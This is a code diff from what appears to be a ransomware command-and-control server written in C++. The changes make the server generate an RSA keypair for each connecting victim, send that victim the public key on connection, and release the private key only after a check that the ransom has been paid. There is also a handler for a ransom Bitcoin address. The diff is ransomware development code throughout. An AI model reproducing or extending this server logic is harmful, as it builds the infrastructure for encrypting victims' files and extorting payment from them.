@@ -72,16 +72,17 @@ BOOL ServerInterface::PerformTCPRequest(ClientMessage req, long cuid) {
 		return success;
 
 	switch ( req.action ) {
-	case ClientMessage::REQUEST_PUBLIC_ENCRYPTION_KEY:
+	case ClientMessage::REQUEST_PRIVATE_ENCRYPTION_KEY:
 		if ( !IsRansomPaid(client) ) {
 			success = FALSE;
 			break;
 		}
 
-		responseCommand.action = RemoteAction::RETURN_PUBLIC_RSA_KEY;
+		responseCommand.action = RemoteAction::RETURN_PRIVATE_RSA_KEY;
 		responseCommand.publicEncryptionKey = client.RSAPublicKey;
 		responseCommand.privateEncryptionKey = client.RSAPrivateKey;
 		success = TCPSendMessageToClient(cuid, responseCommand);
+		std::cout << "sending\n";
 
 		break;
 	case ClientMessage::REQUEST_RANSOM_BTC_ADDRESS:
@@ -109,7 +110,7 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 			continue;
 		}
 		
-		// receive data from client, decrypt it using their aes key
+		// receive data from client, decrypt it using their rsa key
 		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(this->TCPServerDetails.sfd, cuid);
 		receiving = receivedData.valid;
 
@@ -131,10 +132,17 @@ void ServerInterface::AcceptTCPConnections() {
 		std::cout << "Accepted a client on the tcp server." << std::endl;
 
 		Client newClient(addr); // make a new client and store the addr info in it
-		//newClient.SetRSAKeys(this->GenerateRSAPair());
+		newClient.SetRSAKeys(this->GenerateRSAPair());
 		AddToClientList(newClient); // add them to the client list
 
 		std::cout << "- Added the client to the client list\n";
+
+		// send the rsa public key to the client on join
+		ServerCommand cmd;
+		cmd.publicEncryptionKey = newClient.RSAPublicKey;
+		cmd.action = RETURN_PUBLIC_RSA_KEY;
+		cmd.valid = TRUE;
+		TCPSendMessageToClient(newClient.ClientUID, cmd);
 
 		//// start receiving tcp data from that client for the lifetime of that client
 		std::thread receive(&ServerInterface::TCPReceiveMessagesFromClient, this, newClient.ClientUID);
@@ -287,7 +295,10 @@ ClientResponse ServerInterface::PingClient(long cuid) {
 		return {};
 
 	// send the ping to the client over tcp
-	ServerCommand pingCommand = { true, {}, "", client.RSAPublicKey, "", PING_CLIENT};
+	ServerCommand pingCommand;
+	pingCommand.action = RemoteAction::PING_CLIENT;
+	pingCommand.valid = TRUE;
+	
 	BOOL sent = TCPSendMessageToClient(cuid, pingCommand);
 	if ( !sent )
 		return {};
@@ -348,7 +359,7 @@ Data ServerInterface::DecryptClientData(BYTESTRING cipher, long cuid) {
 		return {};
 
 	ClientData  clientInfo    = GetClientData(cuid);
-	std::string decryptionKey = clientInfo.second.first;
+	BIO*        decryptionKey = clientInfo.second.first;
 	Data        decrypted     = NetCommon::DecryptInternetData<Data>(cipher, decryptionKey);
 	
 	return decrypted;
@@ -364,7 +375,7 @@ ClientResponse ServerInterface::DecryptClientResponse(long cuid, BYTESTRING resp
 
 BYTESTRING ServerInterface::EncryptServerRequest(ServerRequest& req) {
 	BYTESTRING serialized = NetCommon::SerializeStruct(req);
-	BYTESTRING cipher = NetCommon::AESEncryptStruct(serialized, req.publicEncryptionKey);
+	BYTESTRING cipher = NetCommon::RSAEncryptStruct(serialized, req.publicEncryptionKey);
 
 	return cipher;
 }
